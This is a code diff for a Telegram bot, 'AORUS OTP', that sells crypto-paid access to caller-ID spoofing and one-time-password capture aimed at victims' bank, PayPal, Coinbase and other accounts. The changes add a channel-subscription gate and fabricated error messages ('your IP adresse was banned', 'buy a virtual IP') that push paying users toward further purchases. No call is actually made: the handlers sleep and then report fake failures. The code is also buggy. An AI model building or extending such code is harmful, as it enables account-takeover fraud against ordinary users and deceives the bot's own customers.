@@ -10,6 +10,8 @@ from db import create_users_table, get_user_info, add_user,set_user_value, get_u
 from time import sleep
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
+from aiogram.types import ChatMember
+from aiogram.enums.chat_member_status import ChatMemberStatus
 import re
 import os
 
@@ -111,6 +113,16 @@ def set_expired_date(user_id,plan):
     set_user_value(user_id,'date',str(expire_date))
 
 
+#is user in channels
+async def is_user_in_channel(bot: Bot, user_id):
+    try:
+        member: ChatMember = await bot.get_chat_member(chat_id=vouches_ID, user_id=user_id)
+        member1: ChatMember = await bot.get_chat_member(chat_id=main_channel_ID, user_id=user_id)
+        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR] and member1.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]
+    except:
+        return True
+    
+
 #START
 @dp.message(Command("start")) #DONE
 async def start_message(message):
@@ -207,10 +219,10 @@ async def switch_wallets(message: Message):
     if user_id == admin_ID:
         if btc != 'bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk':
             btc,usdt,sol,ltc = 'bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk','TRRVAuPEGJ4EgE33u1pV6gNUXxM1R5v1aY','8Ra9HKVrKNakEeQfqDzrVn1sFoQoFmbR51UHMRweT9hY','LRJ8n55djedy4jyKP3Kkqi6iEy3BYC1FLt'
-            message.answer("From kacem wallets to ma7moud wallets switched successfully.")
+            await message.answer("From kacem wallets to ma7moud wallets switched successfully.")
         else:
             btc,usdt,sol,ltc = '12cb6coYbjnWZz2iwmJQu7mozsNNiNVhDZ','TEVNwArAAHUQt85QzPLmrvr3mbYo1NCVpr','826JXyvv4VG9ktLbNWxJ7sde8SGSJRBqsAe8VQr5LShm','LfUJW3kWVh1JW3WcXLvskw15s3ywm55qkL'
-            message.answer("From ma7moud wallets to kacem wallets switched successfully.")
+            await message.answer("From ma7moud wallets to kacem wallets switched successfully.")
     else:
         await message.answer("🚫 Only admin can use this command.")
 
@@ -248,24 +260,39 @@ async def switch_vouches_link(message: Message):
 async def phonelist(message: Message):
     user_id = message.from_user.id
     if not (get_user_info(user_id,'banned')):
-        keyboard = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [
-                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
-                ],
-                [
-                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
+                    ],
+                    [
+                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+                    ]
                 ]
-            ]
-            )
-        await message.answer("""*Spoofing Numbers list*
+                )
+            await message.answer("""*Spoofing Numbers list*
 
-  `4165550137`
-  `2125550143`
-  `7800667788`
-  `6045550198`
-  `3105550191`
-  `7480112233`""",parse_mode='MarkdownV2',reply_markup=keyboard)
+    `4165550137`
+    `2125550143`
+    `7800667788`
+    `6045550198`
+    `3105550191`
+    `7480112233`""",parse_mode='MarkdownV2',reply_markup=keyboard)
+        else:
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await message.delete()
+            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 
 #CHECK FOR SERVICES
@@ -273,27 +300,41 @@ async def phonelist(message: Message):
 async def check_services(message: Message):
     user_id = message.from_user.id
     if not (get_user_info(user_id,'banned')):
-        keyboard = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [
-                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
-                ],
-                [
-                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
+                    ],
+                    [
+                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+                    ]
                 ]
-            ]
-            )
-        await message.answer("""*Services list*
+                )
+            await message.answer("""*Services list*
 
-  `marcus` \| `zelle` \| `email`
-  `cibc` \| `cashapp` \| `applepay`
-  `paypal` \| `bankofamerica` \| `amazon`
-  `gmail` \| `wellsfargo` \| `venmo`
-  `citizens` \| `bank` \| `capitalone`
- `coinbase` \| `afterpay` \| `visa` 
-  `mastercard` \| `facebook` \| `whatsapp`
-  `instagram`""",parse_mode='MarkdownV2',reply_markup=keyboard)
-        
+    `marcus` \| `zelle` \| `email`
+    `cibc` \| `cashapp` \| `applepay`
+    `paypal` \| `bankofamerica` \| `amazon`
+    `gmail` \| `wellsfargo` \| `venmo`
+    `citizens` \| `bank` \| `capitalone`
+    `coinbase` \| `afterpay` \| `visa` 
+    `mastercard` \| `facebook` \| `whatsapp`
+    `instagram`""",parse_mode='MarkdownV2',reply_markup=keyboard)
+        else:
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await message.delete()
+            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 #PURACHSING COMMAND
 @dp.message(Command("purchase")) #DONE
@@ -376,72 +417,129 @@ async def redeem(message: Message): #DONE
             username='None'
         if len(args) < 2:
             await message.answer("❌ Please enter your activation key. /redeem [activation key]")
-        elif args[1] in key1hour:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'1hour')
-            await message.answer("🌅 Trial Key for 1 Hour redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Hour key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-        elif args[1] in key1day:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'1day')
-            await message.answer("🌅 Key for 1 Day redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Day key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-        elif args[1] in key3days:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'3days')
-            await message.answer("🌅 Key for 3 Days redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Days key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-        elif args[1] in key1week:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'1week')
-            await message.answer("🌅 Key for 1 Week redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Week key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-        elif args[1] in key1month:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'1month')
-            await message.answer("🌅 Key for 1 Month redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Month key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-        elif args[1] in key3months:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(3)
-            set_expired_date(user_id,'3months')
-            await message.answer("🌅 Key for 3 Months redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
-            await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Months key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
         elif args[1] == '192.168.56.101':
             sleep(1)
             await message.answer("⌛ Please wait.")
             sleep(3)
             await message.answer("🌅 Virtual IP adresse redeemed successfully!")
             await bot.send_message(chat_id=redeem_ip_ID,text='🆕 *user redeemed IP*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
-            set_user_value(int(args[1]),'banned',True)
-            await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
-            for msg_id in range(message.message_id - 50, message.message_id):
-                try:
-                    await bot.delete_message(chat_id=int(args[1]), message_id=msg_id)
-                except:
-                    pass
-            try:
-                await bot.ban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
-                await bot.ban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
-                await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
-            except Exception as e:
-                await bot.send_message(chat_id=banned_ID,text="Failed to ban user: "+str(e))      
+            set_user_value(int(args[1]),'banned',True) 
         else:
-            sleep(1)
-            await message.answer("⌛ Please wait.")
-            sleep(5)
-            await message.answer("❌ Unavailable or expired key.")
+            keyboard1 = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="🆘 Support", url=admin_link)
+            ]
+        ]
+        )
+            if args[1] in key1hour:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'1hour')
+                    await message.answer("🌅 Trial Key for 1 Hour redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Hour key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] in key1day:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'1day')
+                    await message.answer("🌅 Key for 1 Day redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Day key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] in key3days:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'3days')
+                    await message.answer("🌅 Key for 3 Days redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Days key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] in key1week:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'1week')
+                    await message.answer("🌅 Key for 1 Week redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Week key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] in key1month:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'1month')
+                    await message.answer("🌅 Key for 1 Month redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 1 Month key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] in key3months:
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    set_expired_date(user_id,'3months')
+                    await message.answer("🌅 Key for 3 Months redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed 3 Months key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            elif args[1] == 'AORUS-0VYCJ-P6HZG-LLIWW-8Q5X4':
+                if not (get_user_info(user_id,'IP')):
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(3)
+                    await message.answer("🌅 Premium key redeemed successfully!\n🫂 Thank you for purchasing AORUS OTP.")
+                    await bot.send_message(chat_id=redeemed_keys_ID,text='🆕 *user redeemed premium key*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'first_name'))+'`',parse_mode='MarkdownV2')
+                    set_user_value(int(args[1]),'banned',True)
+                    await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'first_name')+' unbanned successfully!')
+                    for msg_id in range(message.message_id - 50, message.message_id):
+                        try:
+                            await bot.delete_message(chat_id=user_id, message_id=msg_id)
+                        except:
+                            pass
+                    try:
+                        await bot.ban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
+                        await bot.ban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
+                        await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'first_name')+" has been banned from the channels.")
+                    except Exception as e:
+                        await bot.send_message(chat_id=banned_ID,text="Failed to ban user: "+str(e))      
+                else:   
+                    sleep(1)
+                    await message.answer("⌛ Please wait.")
+                    sleep(9)
+                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram sorry you can't redeem the key, you have to buy a virtual IP adresse to redeem your key.\n\nContact the support for help.",reply_markup=keyboard1)
+            else:
+                sleep(1)
+                await message.answer("⌛ Please wait.")
+                sleep(5)
+                await message.answer("❌ Unavailable or expired key.")
 
 
 #call
@@ -449,78 +547,106 @@ async def redeem(message: Message): #DONE
 async def send_local_video(message: Message):
     user_id = message.from_user.id
     if not (get_user_info(user_id,'banned')):
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
-        keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
-        if get_user_info(user_id,'date')!='N/A':
-                now = datetime.now()
-                expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
-                if now < expire_date:
-                    args = message.text.split(maxsplit=4)
-                    if len(args)<4:
-                        await message.answer("You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
+            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
+            if get_user_info(user_id,'date')!='N/A':
+                    now = datetime.now()
+                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
+                    if now < expire_date:
+                        args = message.text.split(maxsplit=4)
+                        if len(args)<4:
+                            await message.answer("You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
+                        else:
+                            victim=args[1]
+                            number=args[2]
+                            if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[4].isdecimal() and args[3] in services:
+                                sleep(1)
+                                await message.answer("""🔥 CALL STARTED 
+    📲 VICTIM NUMBER : """+victim+"""
+    📞 CALLER ID : """+number+"""
+    🏦 SERVICE NAME : """+args[3]+"""
+    ⚙️ OTP DIGITS: """+args[4])
+                                sleep(8)
+                                if not (get_user_info(user_id,'trial')): 
+                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
+                                else:
+                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
+                            elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
+                                await message.answer("You have to type a valid phone number.")
+                            elif args[3] not in services:
+                                await message.answer("You have to choose a valid service.\nType /services to check our available services.")
+                            elif not(args[4].isdecimal()):
+                                await message.answer("The digits must be between 4 and 8")
                     else:
-                        victim=args[1]
-                        number=args[2]
-                        if victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15 and args[4].isdecimal() and args[3] in services:
-                            sleep(1)
-                            await message.answer("""🔥 CALL STARTED 
- 📲 VICTIM NUMBER : """+victim+"""
- 📞 CALLER ID : """+number+"""
- 🏦 SERVICE NAME : """+args[3]+"""
- ⚙️ OTP DIGITS: """+args[4])
-                            sleep(8)
-                            if not (get_user_info(user_id,'trial')): 
-                                await message.answer("❌ ERROR[405]\n\n Sorry your IP adresse was banned you can't make a call.\ncontact the support for help.",reply_markup=keyboard)
-                            else:
-                                await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
-                        elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
-                            await message.answer("You have to type a valid phone number.")
-                        elif args[3] not in services:
-                            await message.answer("You have to choose a valid service.\nType /services to check our available services.")
-                        elif not(args[4].isdecimal()):
-                            await message.answer("The digits must be between 4 and 8")
-                else:
-                    await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
-        elif get_user_info(user_id,'date') =='N/A':
-            await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
-
+                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
+            elif get_user_info(user_id,'date') =='N/A':
+                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
+        else:
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await message.delete()
+            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 #PREBUILT COMMANDS
 @dp.message(Command("paypal","venmo","applepay","coinbase","microsoft","amazon","quadpay")) #DONE
 async def prebuilt_commands(message: Message):
     user_id = message.from_user.id
     if not (get_user_info(user_id,'banned')):
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
-        keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
-        if get_user_info(user_id,'date')!='N/A':
-                now = datetime.now()
-                expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
-                if now < expire_date:
-                    args = message.text.split(maxsplit=2)
-                    if len(args)<3:
-                        await message.answer("You have to enter 2 arguments, "+args[0]+" [victim_number] [digitlenght]")
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🆘 Support", url=admin_link)]])
+            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")],[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]])
+            if get_user_info(user_id,'date')!='N/A':
+                    now = datetime.now()
+                    expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
+                    if now < expire_date:
+                        args = message.text.split(maxsplit=2)
+                        if len(args)<3:
+                            await message.answer("You have to enter 2 arguments, "+args[0]+" [victim_number] [digitlenght]")
+                        else:
+                            victim=args[1]
+                            if victim.isdecimal() and 6<=len(victim)<=15 and args[2].isdecimal():
+                                sleep(1)
+                                await message.answer("""🔥 CALL STARTED 
+    📲 VICTIM NUMBER : """+victim+"""
+    📞 CALLER ID : 7800667788
+    ⚙️ OTP DIGITS: """+args[2])
+                                sleep(8)
+                                if not (get_user_info(user_id,'trial')): 
+                                    await message.answer("❌ ERROR[302]\n\nSorry you can't make a call because your country doesen't support the spoofing.\nContact the support for help.",reply_markup=keyboard)
+                                else:
+                                    await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
+                            elif not(victim.isdecimal() and 6<=len(victim)<=15):
+                                await message.answer("You have to type a valid phone number.")
+                            elif not(args[4].isdecimal()):
+                                await message.answer("The digits must be between 4 and 8")
                     else:
-                        victim=args[1]
-                        if victim.isdecimal() and 6<=len(victim)<=15 and args[2].isdecimal():
-                            sleep(1)
-                            await message.answer("""🔥 CALL STARTED 
- 📲 VICTIM NUMBER : """+victim+"""
- 📞 CALLER ID : 7800667788
- ⚙️ OTP DIGITS: """+args[2])
-                            sleep(8)
-                            if not (get_user_info(user_id,'trial')): 
-                                await message.answer("❌ ERROR[405]\n\n Sorry your IP adresse was banned you can't make a call.\ncontact the support for help.",reply_markup=keyboard)
-                            else:
-                                await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
-                        elif not(victim.isdecimal() and 6<=len(victim)<=15):
-                            await message.answer("You have to type a valid phone number.")
-                        elif not(args[4].isdecimal()):
-                            await message.answer("The digits must be between 4 and 8")
-                else:
-                    await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
-        elif get_user_info(user_id,'date') =='N/A':
-            await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
-
+                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
+            elif get_user_info(user_id,'date') =='N/A':
+                await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
+        else:
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await message.delete()
+            await message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 #RESTART
 @dp.callback_query(F.data.in_(["back"]))#DONE
@@ -553,7 +679,7 @@ async def restart_message(callback: CallbackQuery, bot: Bot):
 Hello *"""+escape_markdown(name)+"""*\,                         
 Step into the future of OTP spoofing with *AORUS OTP*\.
 
-🔥 *Why HAYASHI OTP?*
+🔥 *Why AORUS OTP?*
 Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control — all designed to deliver *unrivaled OTP capture performance*\.
 
 🎯 *Core Features*
@@ -563,40 +689,86 @@ Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and s
 🔸 Global Coverage with 100% Uptime""", reply_markup=keyboard,parse_mode='MarkdownV2')
 
 
+#CHECK IF USER IN CHANNELS
+@dp.callback_query(F.data.in_(["check_subchannel"]))#DONE
+async def check_subchannel(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not(get_user_info(user_id,"banned")):
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+                ]
+            ]
+            )
+            await callback.message.delete()
+            await callback.message.answer("✔ You are a subscriber.\nYou can use the bot now.", reply_markup=keyboard)
+        else:
+            await callback.message.delete()
+            await callback.message.answer("❌ You didn't subscribe yet.", reply_markup=keyboard)
+            keyboard = InlineKeyboardMarkup(
+                inline_keyboard=[
+                    [
+                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
+                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
+                    ],
+                    [
+                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
+                    ]
+                ]
+                )
+            await callback.message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)
+
+
 #COMMANDS
 @dp.callback_query(F.data.in_(["Commands"]))#DONE
 async def commands(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if not (get_user_info(user_id,'banned')):
-        keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
-            ],
-            [
-                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+        if is_user_in_channel(bot,user_id):
+            keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
+                ],
+                [
+                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+                ]
             ]
-        ]
-        )
-        await callback.message.delete()
-        await callback.message.answer("""*AORUS OTP* \- Commands
-❓ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
-    • /redeem    ➜ Redeem a key
-    • /Phonelist ➜ Check List of Latest Spoof Numbers
-    • /call      ➜ Capture OTP for any service
-    • /plan      ➜ Check account status
-    • /purchase  ➜ Purchase access to the bot
-    • /services  ➜ All services available
-                                                                                
-⚙️ Pre\-built modules
-    • /paypal    ➜ Paypal Code
-    • /venmo     ➜ Venmo Code
-    • /applepay  ➜ ApplePay Code
-    • /coinbase  ➜ Coinbase Code
-    • /microsoft ➜ Microsoft Code
-    • /amazon    ➜ Amazon Code
-    • /quadpay   ➜ Quadpay Code""",reply_markup=keyboard,parse_mode='MarkdownV2')
-
+            )
+            await callback.message.delete()
+            await callback.message.answer("""*AORUS OTP* \- Commands
+    ❓ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
+        • /redeem    ➜ Redeem a key
+        • /Phonelist ➜ Check List of Latest Spoof Numbers
+        • /call      ➜ Capture OTP for any service
+        • /plan      ➜ Check account status
+        • /purchase  ➜ Purchase access to the bot
+        • /services  ➜ All services available
+                                                                                    
